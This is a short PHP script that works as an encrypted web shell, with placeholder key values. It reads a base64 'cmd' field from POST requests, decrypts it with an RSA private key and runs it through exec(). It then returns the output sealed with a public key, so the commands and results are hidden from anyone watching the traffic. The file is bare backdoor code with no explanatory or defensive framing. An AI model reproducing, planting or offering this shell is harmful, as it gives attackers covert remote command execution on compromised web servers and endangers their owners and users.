<?php

$pubkey= "[PUBLIC-KEY]";

$privkey="[PRIVATE-KEY]";

if (isset($_POST['cmd']))
{
$cmd=($_POST['cmd']);

$cmd=base64_decode($cmd);
	
openssl_private_decrypt($cmd,$execute,$privkey, OPENSSL_PKCS1_OAEP_PADDING);

$result = "";
## $execute has the CMD
#echo $cmd
exec($execute,$array);
foreach ($array as $line){
	$result=$result . $line ."\n";
}
openssl_seal($result, $sealed, $pass, array($pubkey));
echo base64_encode($pass[0]) . "<br />" . base64_encode($sealed);
#echo $sealed;
	
#result = openssl_encrypt($result,AES,$password);
#$encrypted=base64_encode($encrypted);
#echo $encrypted;
}
?> 
